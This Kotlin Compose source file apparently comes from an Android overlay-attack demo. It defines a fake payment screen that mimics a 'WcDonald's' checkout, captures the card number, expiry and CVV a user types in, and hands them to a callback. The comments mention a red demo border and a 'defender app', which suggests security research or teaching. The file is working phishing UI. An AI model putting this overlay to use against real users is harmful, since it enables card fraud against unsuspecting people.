package com.ghosttouch.attacker.overlay

import android.util.Log
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.CreditCard
import androidx.compose.material.icons.filled.DateRange
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Fake payment overlay — pixel-perfect replica of the WcDonald's PaymentScreen.
 *
 * Uses the exact same Material3 Scaffold/TopAppBar/Card/OutlinedTextField layout
 * as the real defender app.
 *
 * Red border added for demo visibility.
 */

private val WcRed = Color(0xFFDA291C)
private val WcWhite = Color(0xFFFFFFFF)
private val WcBackground = Color(0xFFFAFAFA)
private val WcGray = Color(0xFFF5F5F5)
private val DemoBorderRed = Color(0xFFFF0000)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FakePaymentOverlay(
    onPaymentCaptured: (cardNumber: String, expiry: String, cvv: String) -> Unit,
    onDismiss: () -> Unit
) {
    var cardNumber by remember { mutableStateOf("") }
    var expiry by remember { mutableStateOf("") }
    var cvv by remember { mutableStateOf("") }
    var cardHolder by remember { mutableStateOf("") }
    val coroutineScope = rememberCoroutineScope()

    Box(
        modifier = Modifier
            .fillMaxSize()
            .border(3.dp, DemoBorderRed)
            .background(WcBackground)
    ) {
        Scaffold(
            containerColor = WcBackground,
            topBar = {
                TopAppBar(
                    title = { Text("Payment") },
                    navigationIcon = {
                        IconButton(onClick = { /* fake back */ }) {
                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                        }
                    },
                    colors = TopAppBarDefaults.topAppBarColors(
                        containerColor = WcRed,
                        titleContentColor = WcWhite,
                        navigationIconContentColor = WcWhite
                    )
                )
            }
        ) { padding ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(24.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                Text(
                    "Order Summary",
                    style = MaterialTheme.typography.titleLarge,
                    fontWeight = FontWeight.Bold
                )

                // Fake order summary — identical Card to defender
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = CardDefaults.cardColors(containerColor = WcGray)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        OrderItem("WcBurger Deluxe", "$8.99")
                        OrderItem("Large Fries", "$3.49")
                        OrderItem("WcFlurry", "$4.29")
                        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
                        OrderItem("Total", "$16.77", bold = true)
                    }
                }

                Spacer(modifier = Modifier.height(8.dp))

                Text(
                    "Card Details",
                    style = MaterialTheme.typography.titleMedium,
                    fontWeight = FontWeight.Bold
                )

                OutlinedTextField(
                    value = cardHolder,
                    onValueChange = { cardHolder = it },
                    label = { Text("Cardholder Name") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = cardNumber,
                    onValueChange = {
                        if (it.length <= 16) cardNumber = it.filter { c -> c.isDigit() }
                    },
                    label = { Text("Card Number") },
                    leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    OutlinedTextField(
                        value = expiry,
                        onValueChange = { if (it.length <= 5) expiry = it },
                        label = { Text("MM/YY") },
                        leadingIcon = { Icon(Icons.Default.DateRange, contentDescription = null) },
                        singleLine = true,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )
                    OutlinedTextField(
                        value = cvv,
                        onValueChange = {
                            if (it.length <= 3) cvv = it.filter { c -> c.isDigit() }
                        },
                        label = { Text("CVV") },
                        leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                        singleLine = true,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )
                }

                Spacer(modifier = Modifier.height(8.dp))

                Button(
                    onClick = {
                        val capturedCard = cardNumber
                        val capturedExpiry = expiry
                        val capturedCvv = cvv
                        Log.d("FakePaymentOverlay", "Capturing: card=*${capturedCard.takeLast(4)}")
                        onPaymentCaptured(capturedCard, capturedExpiry, capturedCvv)
                        coroutineScope.launch {
                            delay(500)
                            onDismiss()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = WcRed),
                    enabled = cardNumber.length == 16 && cvv.length == 3 && expiry.isNotBlank()
                ) {
                    Text("Pay $16.77", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                }
            }
        }
    }
}

@Composable
private fun OrderItem(name: String, price: String, bold: Boolean = false) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(
            name,
            fontWeight = if (bold) FontWeight.Bold else FontWeight.Normal,
            fontSize = if (bold) 16.sp else 14.sp
        )
        Text(
            price,
            fontWeight = if (bold) FontWeight.Bold else FontWeight.Normal,
            fontSize = if (bold) 16.sp else 14.sp
        )
    }
}
